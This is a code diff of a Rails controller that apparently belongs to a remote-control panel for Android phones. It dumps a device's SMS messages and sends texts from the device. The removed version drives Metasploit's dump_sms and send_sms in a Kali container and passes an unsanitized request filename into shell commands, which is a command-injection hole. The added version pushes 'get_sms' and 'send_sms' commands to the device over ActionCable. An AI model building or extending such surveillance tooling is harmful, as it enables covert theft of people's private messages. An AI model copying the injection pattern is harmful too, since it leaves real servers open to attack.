@@ -1,46 +1,26 @@
 class SmsMessagesController < InheritedResources::Base
   def dump_messages
     begin
-      commandTimeout = params[:exec_timeout].to_i
-      downloadTimeout = params[:copy_timeout].to_i
-      fileName = params[:filename].to_s
-      @smartphone = Smartphone.find(params[:smartphone_id])
-      currentTime = DateTime.now
-      currentTimeFormat = currentTime.strftime("%Y-%m-%d_%H--%M--%S")
-      @fileName = fileName.empty? ?
-        "sms_messages_dump_" + currentTimeFormat + ".txt" :
-        fileName + ".txt"
-      processCommand = "dump_sms -o #{@fileName}"
-      commandOutput = start_msf_process(processCommand)
-      1.upto(commandTimeout) do |n|
-        if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
-          break
-        else
-          puts "Waiting ..."
-        end
-        sleep 1
-      end
-      copyMessagesCommand = "docker cp kali_container:/#{@fileName} files/dumps/sms_messages_dumps/#{@fileName}"
-      system(copyMessagesCommand)
-      fullPath = "files/dumps/sms_messages_dumps/" + @fileName
-      isOperationSuccessful = false
-      1.upto(downloadTimeout) do |n|
-        if File.file?(fullPath)
-          newMessageDump = SmsMessage.new(:date => currentTimeFormat.gsub("_", " ").gsub("--", ":"),
-                                          :filename => @fileName,
-                                          :smartphone_id => @smartphone.id)
-          newMessageDump.save!
-          isOperationSuccessful = true
-          break
-        else
-          puts "Waiting ..."
-        end
-        sleep 1
-      end
-      commandOutput = ["Operation Failed"] if not isOperationSuccessful
-    rescue
-      puts "Error on dump messages"
-      commandOutput = ["Operation Failed"]
+      smartphone_id = params[:smartphone_id]
+      @smartphone = Smartphone.find(smartphone_id)
+      
+      # Send command via ActionCable to Android app
+      command_data = {
+        command: "get_sms",
+        timestamp: Time.now.to_i
+      }
+      
+      ActionCable.server.broadcast(
+        "command_channel_#{@smartphone.device_id}",
+        command_data
+      )
+      
+      commandOutput = ["Command sent to device #{@smartphone.device_id}", "SMS dump requested..."]
+      @fileName = "sms_dump_#{Time.now.to_i}.txt"
+    rescue => e
+      puts "Error on dump messages: #{e.message}"
+      commandOutput = ["Operation Failed: #{e.message}"]
+      @fileName = "error.txt"
     end
     respond_to do |format|
       format.js {
@@ -52,12 +32,32 @@ class SmsMessagesController < InheritedResources::Base
   end
 
   def send_sms
-    processCommand = 'send_sms -d 0729380759 -t "bla bla"'
-    commandOutput = start_msf_process(processCommand)
+    begin
+      @smartphone = Smartphone.find(params[:smartphone_id])
+      phone_number = params[:phone_number] || '0729380759'
+      message_text = params[:message] || 'Test message'
+      
+      pending_command = send_command_and_wait(
+        @smartphone, 
+        'send_sms', 
+        { phone_number: phone_number, message: message_text }, 
+        timeout: 15.seconds
+      )
+      
+      if pending_command.completed?
+        commandOutput = ["SMS sent successfully to #{phone_number}"]
+      else
+        commandOutput = ["Operation Failed"]
+      end
+      
+    rescue => e
+      Rails.logger.error("Error sending SMS: #{e.message}")
+      commandOutput = ["Operation Failed: #{e.message}"]
+    end
+    
     respond_to do |format|
       format.js {
-        render "send_message",
-               :locals => { :commandOutput => commandOutput }
+        render "send_message", locals: { commandOutput: commandOutput }
       }
     end
   end
